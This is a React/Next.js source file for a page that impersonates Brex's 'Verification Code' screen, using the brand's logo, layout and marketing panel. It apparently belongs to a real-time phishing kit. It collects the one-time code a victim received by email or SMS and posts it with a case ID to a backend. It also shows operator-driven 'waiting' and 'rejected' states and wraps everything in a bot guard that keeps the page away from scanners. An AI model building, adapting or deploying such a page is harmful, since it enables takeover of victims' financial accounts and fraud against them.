'use client';

/**
 * Brex Secret Key / Verification Code Page
 * Split-screen layout matching Brex design
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setSecretKey('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!secretKey.trim()) {
        setFieldError('Please enter your verification code');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey.trim(),
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your code. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your code...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [secretKey, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="brex-boundary">
        <div className="brex-app">

          {/* Left Column */}
          <main className="brex-layout">

            <div className="auth-org-logo">
              <img src="/logo_full_4x.png" alt="Brex Logo" />
            </div>

            <div className="auth-container">

              {/* Error */}
              {fieldError && (
                <div className="global-error">
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path fillRule="evenodd" clipRule="evenodd"
                      d="M8 15C11.866 15 15 11.866 15 8C15 4.13401 11.866 1 8 1C4.13401 1 1 4.13401 1 8C1 11.866 4.13401 15 8 15ZM7 4.5C7 3.94772 7.44772 3.5 8 3.5C8.55228 3.5 9 3.94772 9 4.5V8.5C9 9.05228 8.55228 9.5 8 9.5C7.44772 9.5 7 9.05228 7 8.5V4.5ZM7 11.5C7 10.9477 7.44772 10.5 8 10.5C8.55228 10.5 9 10.9477 9 11.5C9 12.0523 8.55228 12.5 8 12.5C7.44772 12.5 7 12.0523 7 11.5Z"
                      fill="#b92d26" />
                  </svg>
                  <span>{fieldError}</span>
                </div>
              )}

              <h1>Verification Code</h1>

              <form className="auth-form" onSubmit={handleSubmit} noValidate>
                <p className="form-description">
                  Enter the code you received via email or SMS to verify your identity.
                </p>

                <div className="o-form-fieldset">
                  <label htmlFor="secret-key">Verification Code</label>
                  <div className="input-wrapper">
                    <input
                      type="text"
                      id="secret-key"
                      name="secret-key"
                      autoComplete="off"
                      value={secretKey}
                      onChange={(e) => {
                        setSecretKey(e.target.value);
                        if (fieldError) setFieldError('');
                      }}
                      disabled={isWaiting}
                    />
                  </div>
                </div>

                <div className="auth-actions">
                  <button
                    type="submit"
                    className="button-primary"
                    disabled={!secretKey.trim() || isWaiting}
                  >
                    {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
                    {isWaiting ? 'Verifying...' : 'Verify'}
                  </button>
                </div>
              </form>

              <p className="form-footer" style={{ marginTop: '16px' }}>
                Need help? Contact {currentBrand.companyName} support
              </p>
            </div>

            <div className="signup-link">
              New to Brex? <a href="#">Sign up</a>
            </div>

          </main>

          {/* Right Column: Marketing */}
          <aside className="marketing-content">
            <div className="marketing-inner">
              <h2 className="marketing-badge">DOWNLOAD THE MOBILE APP</h2>
              <p className="marketing-title">Access your Brex card anywhere.</p>
              <div className="marketing-img">
                <img src="/customerstories.png" alt="Brex customer stories layout" />
              </div>
            </div>
          </aside>

        </div>
      </div>
    </BotGuard>
  );
}
